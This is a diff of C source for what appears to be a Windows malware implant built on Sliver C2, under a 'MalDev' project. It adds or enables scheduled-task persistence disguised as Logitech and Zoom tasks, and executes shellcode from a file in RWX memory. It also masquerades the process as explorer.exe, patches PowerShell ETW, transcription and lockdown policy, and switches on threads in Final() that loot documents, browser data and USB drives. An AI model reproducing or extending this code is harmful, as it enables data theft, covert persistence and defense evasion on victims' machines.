@@ -134,6 +134,7 @@ BOOL PrintFileName(
 
 	CloseHandle(hDir);
 	StrCpyW(lpOutput, lpPath);
+	return TRUE;
 }
 
 VOID test3
@@ -323,8 +324,8 @@ void test18(void) {
 }
 
 void test19(void) {
-	WTStartPersistence("C:\\Users\\Admin\\source\\repos\\MalDev\\x64\\Debug\\Test.exe");
-	return;
+	/*WTStartPersistence("C:\\Users\\Admin\\source\\repos\\MalDev\\x64\\Debug\\Test.exe");
+	return;*/
 }
 
 void test20(void) {
@@ -642,7 +643,7 @@ void test31(void) {
 }
 
 void test32(void) {
-	CreateAtLogonTask(L"Calc", L"C:\\Windows\\System32\\calc.exe");
+	CreateAtLogonTask(L"Calc", L"\\", L"C:\\Windows\\System32\\calc.exe");
 }
 
 void test33(void) {
@@ -807,9 +808,9 @@ void test46(void) {
 }
 
 void test47(void) {
-	/*CHAR szCommandLine[] = "C:\\Windows\\System32\\cmd.exe";
+	/*WCHAR wszCommandLine[] = L"C:\\Windows\\System32\\cmd.exe";
 
-	PersistenceMethod1(szCommandLine);*/
+	PersistenceMethod1(wszCommandLine);*/
 }
 
 void test48(void) {
@@ -2022,12 +2023,12 @@ void test127(void) {
 }
 
 void test128(void) {
-	GLOBAL_CONFIG Config;
+	/*GLOBAL_CONFIG Config;
 
 	SecureZeroMemory(&Config, sizeof(Config));
 	Config.lpSliverPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech", 0);
 	Config.lpPeerPrivKey = DuplicateStrA("1", 0);
-	Persistence(&Config);
+	Persistence(&Config);*/
 }
 
 VOID Callback129
@@ -2238,7 +2239,7 @@ void test133(void) {
 }
 
 void test134(void) {
-	WCHAR wszPath[0x200];
+	/*WCHAR wszPath[0x200];
 	LPWSTR lpTemp = NULL;
 
 	GetModuleFileNameW(NULL, wszPath, _countof(wszPath));
@@ -2247,7 +2248,7 @@ void test134(void) {
 
 	lstrcatW(wszPath, L"logitech.cfg");
 	UnmarshalConfig(wszPath);
-	DeleteFileW(wszPath);
+	DeleteFileW(wszPath);*/
 }
 
 void test135(void) {
@@ -2643,7 +2644,7 @@ void test152(void) {
 }
 
 void test153(void) {
-	GLOBAL_CONFIG Config;
+	/*GLOBAL_CONFIG Config;
 	LPWSTR DocumentExtensions[] = { L".doc", L".docm", L".docx", L".pdf", L".ppsm", L".ppsx", L".ppt", L".pptm", L".pptx", L".pst", L".rtf", L".xlm", L".xls", L".xlsm", L".xlsx", L".odt", L".ods", L".odp", L".odg", L".odf" };
 	LPWSTR ArchiveExtensions[] = { L".rar", L".zip", L".tar", L".gz", L".xz", L".sz", L".7z" };
 	DWORD i = 0;
@@ -2665,7 +2666,7 @@ void test153(void) {
 	}
 
 	LootFile(&Config);
-	Sleep(100000000);
+	Sleep(100000000);*/
 }
 
 void test154(void) {
@@ -2826,7 +2827,7 @@ void test162(void) {
 }
 
 void test163(void) {
-	WCHAR wszConfigPath[MAX_PATH];
+	/*WCHAR wszConfigPath[MAX_PATH];
 	LPWSTR lpTemp = NULL;
 	PGLOBAL_CONFIG pConfig = NULL;
 	PGLOBAL_CONFIG pTempConfig = NULL;
@@ -2838,7 +2839,7 @@ void test163(void) {
 	pConfig = UnmarshalConfig(wszConfigPath);
 	pConfig->lpConfigPath = DuplicateStrW(L"C:\\Users\\Admin\\Desktop\\config.cfg", 0);
 	MarshalConfig(pConfig);
-	pTempConfig = UnmarshalConfig(pConfig->lpConfigPath);
+	pTempConfig = UnmarshalConfig(pConfig->lpConfigPath);*/
 }
 
 void test164(void) {
@@ -2852,24 +2853,24 @@ void test164(void) {
 }
 
 void test165(void) {
-#ifdef _FULL
-	PPBElement ReqElements[2];
-	PPBElement pFinalElement = NULL;
-	CHAR szCommand[] = "dir C:\\Users\\Admin";
-	ENVELOPE Envelope;
-	SLIVER_SESSION_CLIENT SliverSession;
-
-	SecureZeroMemory(&SliverSession, sizeof(SliverSession));
-	SecureZeroMemory(&ReqElements, sizeof(ReqElements));
-	SecureZeroMemory(&Envelope, sizeof(Envelope));
-	SliverSession.pGlobalConfig = ALLOC(sizeof(GLOBAL_CONFIG));
-	SliverSession.pGlobalConfig->lpSliverPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech", 0);
-	SliverSession.pGlobalConfig->lpPeerPrivKey = DuplicateStrA("1", 0);
-	ReqElements[0] = CreateBytesElement(szCommand, lstrlenA(szCommand), 1);
-	pFinalElement = CreateStructElement(&ReqElements, _countof(ReqElements), 0);
-	Envelope.pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
-	CmdHandler(&Envelope, &SliverSession);
-#endif
+//#ifdef _FULL
+//	PPBElement ReqElements[2];
+//	PPBElement pFinalElement = NULL;
+//	CHAR szCommand[] = "dir C:\\Users\\Admin";
+//	ENVELOPE Envelope;
+//	SLIVER_SESSION_CLIENT SliverSession;
+//
+//	SecureZeroMemory(&SliverSession, sizeof(SliverSession));
+//	SecureZeroMemory(&ReqElements, sizeof(ReqElements));
+//	SecureZeroMemory(&Envelope, sizeof(Envelope));
+//	SliverSession.pGlobalConfig = ALLOC(sizeof(GLOBAL_CONFIG));
+//	SliverSession.pGlobalConfig->lpSliverPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech", 0);
+//	SliverSession.pGlobalConfig->lpPeerPrivKey = DuplicateStrA("1", 0);
+//	ReqElements[0] = CreateBytesElement(szCommand, lstrlenA(szCommand), 1);
+//	pFinalElement = CreateStructElement(&ReqElements, _countof(ReqElements), 0);
+//	Envelope.pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+//	CmdHandler(&Envelope, &SliverSession);
+//#endif
 }
 
 void test166(void) {
@@ -3103,10 +3104,10 @@ void test181(void) {
 	DWORD cbShellcode = 0;
 	PBYTE pBuffer = NULL;
 
-	pShellcode = ReadFromFile(L"D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\FinalTest.sc", &cbShellcode);
+	pShellcode = ReadFromFile(L"C:\\Users\\Admin\\AppData\\Roaming\\CLView\\db.dat", &cbShellcode);
 	pBuffer = (PBYTE)VirtualAlloc(NULL, cbShellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(pBuffer, pShellcode, cbShellcode);
-	pBuffer += 0x8fb90;
+	pBuffer += 0xA6A0;
 	((VOID(*)(VOID))pBuffer)();
 	Sleep(0xFFFFFFFF);
 	return;
@@ -3161,7 +3162,129 @@ void test186(void) {
 	LootBrowserData(&Config);
 }
 
+void test187(void) {
+	BYTE Buffer[] = { 16, 1, 26, 219, 2, 10, 14, 68, 69, 67, 73, 83, 73, 86, 69, 95, 70, 69, 82, 82, 89, 18, 15, 68, 69, 83, 75, 84, 79, 80, 45, 55, 83, 75, 73, 73, 71, 69, 26, 36, 52, 99, 52, 99, 52, 53, 52, 52, 45, 48, 48, 52, 98, 45, 52, 97, 49, 48, 45, 56, 48, 53, 56, 45, 98, 52, 99, 48, 52, 102, 51, 49, 52, 54, 51, 51, 34, 21, 68, 69, 83, 75, 84, 79, 80, 45, 55, 83, 75, 73, 73, 71, 69, 92, 65, 100, 109, 105, 110, 42, 45, 83, 45, 49, 45, 53, 45, 50, 49, 45, 50, 56, 56, 57, 56, 50, 55, 52, 54, 50, 45, 49, 53, 56, 51, 52, 52, 48, 57, 48, 56, 45, 55, 53, 49, 55, 57, 52, 55, 54, 49, 45, 49, 48, 48, 49, 50, 44, 83, 45, 49, 45, 53, 45, 50, 49, 45, 50, 56, 56, 57, 56, 50, 55, 52, 54, 50, 45, 49, 53, 56, 51, 52, 52, 48, 57, 48, 56, 45, 55, 53, 49, 55, 57, 52, 55, 54, 49, 45, 53, 49, 51, 58, 7, 119, 105, 110, 100, 111, 119, 115, 66, 5, 97, 109, 100, 54, 52, 72, 208, 169, 2, 82, 53, 68, 58, 92, 68, 111, 99, 117, 109, 101, 110, 116, 115, 92, 115, 111, 117, 114, 99, 101, 92, 114, 101, 112, 111, 115, 92, 77, 97, 108, 68, 101, 118, 92, 120, 54, 52, 92, 82, 101, 108, 101, 97, 115, 101, 92, 84, 101, 115, 116, 46, 101, 120, 101, 98, 21, 49, 48, 32, 98, 117, 105, 108, 100, 32, 49, 57, 48, 52, 53, 32, 120, 56, 54, 95, 54, 52, 104, 216, 4, 130, 1, 36, 57, 101, 99, 100, 52, 55, 55, 50, 45, 50, 50, 101, 100, 45, 52, 50, 56, 100, 45, 98, 101, 48, 55, 45, 97, 50, 53, 55, 57, 48, 57, 50, 102, 55, 52, 48, 136, 1, 163, 182, 158, 235, 246, 208, 177, 132, 186, 1, 146, 1, 5, 101, 110, 45, 85, 83 };
+	BYTE Key[] = { 73, 16, 174, 197, 227, 68, 53, 53, 127, 80, 212, 76, 89, 155, 27, 5, 43, 76, 208, 44, 25, 2, 41, 79, 133, 4, 7, 139, 17, 166, 63, 56 };
+	BUFFER TempBuffer;
+	PBUFFER pResult = NULL;
+
+	TempBuffer.pBuffer = Buffer;
+	TempBuffer.cbBuffer = sizeof(Buffer);
+	pResult = SliverEncrypt(Key, &TempBuffer);
+	PrintFormatA("pResult:\n");
+	HexDump(pResult->pBuffer, pResult->cbBuffer);
+}
+
+void test188(void) {
+	LPSTR* lpRuntime = NULL;
+
+	lpRuntime = GetRuntimeVersion(NULL);
+	PrintFormatA("Version: %s\n%s", lpRuntime[0], lpRuntime[1]);
+}
+
+void test189(void) {
+	CreateTimeTriggerTask(L"Logitech", L"\\", L"C:\\Windows\\System32\\calc.exe", (BSTR)L"PT1M");
+}
+
+void test190(void) {
+	IsScheduledTaskExist(L"ZoomUpdateTaskUser-S-1-5-21-2889827462-1583440908-751794761-1001", L"\\Microsoft\\Office");
+}
+
+void test191(void) {
+	ShellExecuteW(NULL, L"open", L"cmd.exe", L"/q /c timeout 5 && touch C:\\Users\\Admin\\Desktop\\a.txt", NULL, SW_HIDE);
+}
+
+void test192(void) {
+	LogError(L"Hello Error Log");
+}
+
+void test193(void) {
+	LPWSTR OldPath[5];
+	WCHAR wszExplorerPath[MAX_PATH];
+
+	SecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
+	SecureZeroMemory(OldPath, sizeof(OldPath));
+	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
+	lstrcatW(wszExplorerPath, L"\\explorer.exe");
+	MasqueradeProcessPath(wszExplorerPath, FALSE, OldPath);
+	MessageBoxW(NULL, wszExplorerPath, L"Title", MB_OK);
+	MasqueradedCreateDirectoryFileCOM(L"C:\\Windows\\Setup\\Scripts");
+	MasqueradeProcessPath(NULL, TRUE, OldPath);
+}
+
+void test194(void) {
+	WCHAR wszCurrentDir[MAX_PATH];
+
+	GetCurrentDirectoryW(_countof(wszCurrentDir), wszCurrentDir);
+	PrintFormatW(L"%s\n", wszCurrentDir);
+}
+
+void test195(void) {
+	GLOBAL_CONFIG Config;
+
+	SecureZeroMemory(&Config, sizeof(Config));
+	Config.lpMainExecutable = L"C:\\Windows\\System32\\calc.exe";
+	Persistence3(&Config);
+}
+
+void test196(void) {
+	/*PCLR_CONTEXT pClrCtx = NULL;
+	VARIANT vtInitialRunspaceConfiguration;
+	LPWSTR ppwszArguments[] = { L"-EncodedCommand", L"JABmAGkAbABlAHMAIAA9ACAARwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAVwBpAG4AZABvAHcAcwAnACAALQBGAGkAbABlAAoAZgBvAHIAZQBhAGMAaAAgACgAJABmAGkAbABlACAAaQBuACAAJABmAGkAbABlAHMAKQAgAHsACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIARgBpAGwAZQAgAG4AYQBtAGUAOgAgACQAKAAkAGYAaQBsAGUALgBOAGEAbQBlACkALAAgAGYAaQBsAGUAIABzAGkAegBlADoAIAAkACgAJABmAGkAbABlAC4ATABlAG4AZwB0AGgAKQAgAGIAeQB0AGUAcwAiAAoAfQA=", L"> C:\\Users\\Admin\\Desktop\\output.txt"};
+
+	SecureZeroMemory(&vtInitialRunspaceConfiguration, sizeof(vtInitialRunspaceConfiguration));
+	pClrCtx = InitializeCommonLanguageRuntime(L"TestDomain", NULL);
+	CreateInitialRunspaceConfiguration(pClrCtx->pAppDomain, &vtInitialRunspaceConfiguration);
+	if (!DisablePowerShellEtwProvider(pClrCtx->pAppDomain)) {
+		goto CLEANUP;
+	}
+
+	if (!PatchTranscriptionOptionFlushContentToDisk(pClrCtx->pAppDomain)) {
+		goto CLEANUP;
+	}
+
+	if (!PatchAuthorizationManagerShouldRunInternal(pClrCtx->pAppDomain)) {
+		goto CLEANUP;
+	}
+
+	if (!PatchSystemPolicyGetSystemLockdownPolicy(pClrCtx->pAppDomain)) {
+		goto CLEANUP;
+	}
+
+	StartConsoleShell(pClrCtx->pAppDomain, &vtInitialRunspaceConfiguration, L"Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.", L"Help message", ppwszArguments, ARRAYSIZE(ppwszArguments));
+CLEANUP:
+	return;*/
+}
+
+void test197(void) {
+	ENVELOPE Envelope;
+	PPBElement ReqElements[1];
+	PPBElement pFinalElement = NULL;
+	CHAR wszCommand[] = "cd C:\\Windows\\System32\\winevt\\Logs ; $a = ls -File | where {$_.Name -like \"*shell*\"} ; $a | Get-Member";
+	HANDLE hThread = NULL;
+	DWORD dwThreadID = 0;
+	PENVELOPE ThreadParams[2];
+
+	SecureZeroMemory(&Envelope, sizeof(Envelope));
+	ReqElements[0] = CreateBytesElement(wszCommand, lstrlenA(wszCommand), 1);
+	pFinalElement = CreateStructElement(&ReqElements, _countof(ReqElements), 0);
+	Envelope.pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	ThreadParams[0] = &Envelope;
+
+	/*hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PowerShellHandler, (LPVOID)ThreadParams, 0, &dwThreadID);
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);*/
+	PowerShellHandler(ThreadParams);
+	PrintFormatA("-------------------------------------------------------------\n");
+	PowerShellHandler(ThreadParams);
+	/*hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PowerShellHandler, (LPVOID)ThreadParams, 0, &dwThreadID);
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);*/
+	Sleep(100000);
+}
+
 #endif
+
 BOOL IsInstanceExist
 (
 	PGLOBAL_CONFIG pConfig
@@ -3244,7 +3367,6 @@ VOID Final(VOID)
 	DWORD dwThreadId = 0;
 	PGLOBAL_CONFIG pGlobalConfig = NULL;
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-	WCHAR wszConfigPath[MAX_PATH];
 	LPWSTR lpTemp = NULL;
 	LPWSTR DocumentExtensions[] = { L".doc", L".docm", L".docx", L".pdf", L".ppsm", L".ppsx", L".ppt", L".pptm", L".pptx", L".pst", L".rtf", L".xlm", L".xls", L".xlsm", L".xlsx", L".odt", L".ods", L".odp", L".odg", L".odf" };
 	LPWSTR ArchiveExtensions[] = { L".rar", L".zip", L".tar", L".gz", L".xz", L".sz", L".7z" };
@@ -3252,6 +3374,8 @@ VOID Final(VOID)
 	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
 	LPSTR lpUniqueID = NULL;
 	PBYTE pDigest = NULL;
+	WCHAR wszLastLootTime[MAX_PATH];
+	PBYTE pTemp = NULL;
 
 #ifndef _DEBUG
 	if (CheckForBlackListProcess()) {
@@ -3259,23 +3383,11 @@ VOID Final(VOID)
 	}
 #endif
 
-	GetModuleFileNameW(NULL, wszConfigPath, _countof(wszConfigPath));
-	lpTemp = PathFindFileNameW(wszConfigPath);
-	lpTemp[0] = L'\0';
-	lstrcatW(wszConfigPath, L"logitech.cfg");
-	if (!IsFileExist(wszConfigPath)) {
-		ExpandEnvironmentStringsW(L"%APPDATA%\\Logitech\\logitech.cfg", wszConfigPath, _countof(wszConfigPath));
-		if (!IsFileExist(wszConfigPath)) {
-			goto CLEANUP;
-		}
-	}
-
-	pGlobalConfig = UnmarshalConfig(wszConfigPath);
+	pGlobalConfig = UnmarshalConfig();
 	if (pGlobalConfig == NULL) {
 		goto CLEANUP;
 	}
 
-	pGlobalConfig->lpMainExecutable = DuplicateStrW(L"Can thay doi", 0);
 	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
 	RtlInitializeSRWLock(&pGlobalConfig->RWLock);
 	pGlobalConfig->uPeerID = GeneratePeerID();
@@ -3315,6 +3427,17 @@ VOID Final(VOID)
 	pDigest = ComputeSHA256(lpUniqueID, lstrlenA(lpUniqueID));
 	pGlobalConfig->lpUniqueName = ConvertBytesToHexW(pDigest, SHA256_HASH_SIZE);
 	pGlobalConfig->lpUniqueName[16] = L'\0';
+	
+	if (pGlobalConfig->Loot) {
+		GetTempPathW(_countof(wszLastLootTime), wszLastLootTime);
+		lstrcatW(wszLastLootTime, pGlobalConfig->lpUniqueName);
+		lstrcatW(wszLastLootTime, L".tmp");
+		pTemp = ReadFromFile(wszLastLootTime, NULL);
+		if (pTemp != NULL) {
+			memcpy((LPVOID)(&pGlobalConfig->LastLootTime), pTemp, sizeof(pGlobalConfig->LastLootTime));
+		}
+	}
+
 	ExpandEnvironmentStringsW(L"%ALLUSERSPROFILE%", pGlobalConfig->wszWarehouse, _countof(pGlobalConfig->wszWarehouse));
 	lstrcatW(pGlobalConfig->wszWarehouse, L"\\");
 	lstrcatW(pGlobalConfig->wszWarehouse, pGlobalConfig->lpUniqueName);
@@ -3323,15 +3446,25 @@ VOID Final(VOID)
 	}
 
 #ifndef _DEBUG
+#ifdef _FULL
 	if (!Persistence(pGlobalConfig)) {
 		goto CLEANUP;
 	}
+#else
+	if (!Persistence3(pGlobalConfig)) {
+		goto CLEANUP;
+	}
 #endif
+#endif
+
+	if (!Persistence3(pGlobalConfig)) {
+		goto CLEANUP;
+	}
 
 	if (pGlobalConfig->Loot) {
 		LootBrowserData(pGlobalConfig);
-		/*CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUsb, pGlobalConfig, 0, &dwThreadId);
-		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFile, pGlobalConfig, 0, &dwThreadId);*/
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUsb, pGlobalConfig, 0, &dwThreadId);
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFile, pGlobalConfig, 0, &dwThreadId);
 	}
 
 	if (pGlobalConfig->Clipboard) {
@@ -3355,6 +3488,7 @@ VOID Final(VOID)
 	}
 
 CLEANUP:
+	FREE(pTemp);
 	FREE(lpUniqueID);
 	FreeBeaconClient(pBeaconClient);
 	FreeSessionClient(pSessionClient);
@@ -3368,12 +3502,23 @@ LONG VectoredExceptionHandler
 	_In_ PEXCEPTION_POINTERS ExceptionInfo
 )
 {
-	DWORD dwExpceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
+	DWORD dwExceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
+
+	if (dwExceptionCode == 0xe0434352 || dwExceptionCode == 0x4242420) {
+		return EXCEPTION_CONTINUE_SEARCH;
+	}
 
 #ifdef _DEBUG
-	PrintStackTrace(ExceptionInfo->ContextRecord);
+	PrintFormatW(L"Exception code: 0x%08x\n", dwExceptionCode);
+	if (dwExceptionCode == EXCEPTION_BREAKPOINT) {
+		//PrintStackTrace(ExceptionInfo->ContextRecord);
+		return EXCEPTION_CONTINUE_EXECUTION;
+	}
+	else {
+		PrintStackTrace(ExceptionInfo->ContextRecord);
+		ExitProcess(-1);
+	}
 #endif
-	ExitProcess(-1);
 }
 
 LRESULT WindowProc
@@ -3475,7 +3620,6 @@ int main()
 //		LOG_ERROR("GetProcessShutdownParameters", GetLastError());
 //		goto CLEANUP;
 //	}
-
 	LoadLibraryW(L"advapi32.dll");
 	LoadLibraryW(L"bcrypt.dll");
 	LoadLibraryW(L"combase.dll");
@@ -3494,6 +3638,12 @@ int main()
 	LoadLibraryW(L"winhttp.dll");
 	LoadLibraryW(L"wtsapi32.dll");
 	LoadLibraryW(L"RPCRT4.dll");
+	LoadLibraryW(L"shell32.dll");
+	LoadLibraryW(L"KernelBase.dll");
+	LoadLibraryW(L"userenv.dll");
+	LoadLibraryW(L"ktmw32.dll");
+	LoadLibraryW(L"wS2_32.dll");
+	LoadLibraryW(L"mscoree.dll");
 
 	if (!SetupStackSpoofing()) {
 		return -1;
@@ -3690,6 +3840,17 @@ int main()
 	//test184();
 	//test185();
 	//test186();
+	//test187();
+	//test188();
+	//test189();
+	//test190();
+	//test191();
+	//test192();
+	//test193();
+	//test194();
+	//test195();
+	//test196();
+	//test197();
 	Final();
 	//WaitForSingleObject(hThread, INFINITE);
 CLEANUP:
